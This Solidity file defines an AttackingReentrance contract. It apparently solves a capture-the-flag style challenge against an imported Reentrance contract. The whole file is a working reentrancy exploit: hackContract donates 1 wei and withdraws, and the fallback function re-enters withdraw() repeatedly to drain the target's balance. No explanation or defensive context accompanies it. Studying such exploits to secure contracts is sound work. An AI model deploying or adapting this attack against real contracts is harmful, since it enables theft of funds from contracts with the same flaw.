// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    fallback() external payable {
        if (Reentrance(contractAddress).balanceOf(address(this)) >= 1) {
            Reentrance(contractAddress).withdraw();
        }
    }

    function hackContract() external {
        Reentrance(contractAddress).donate{value: 1}(address(this));
        Reentrance(contractAddress).withdraw();
    }
}
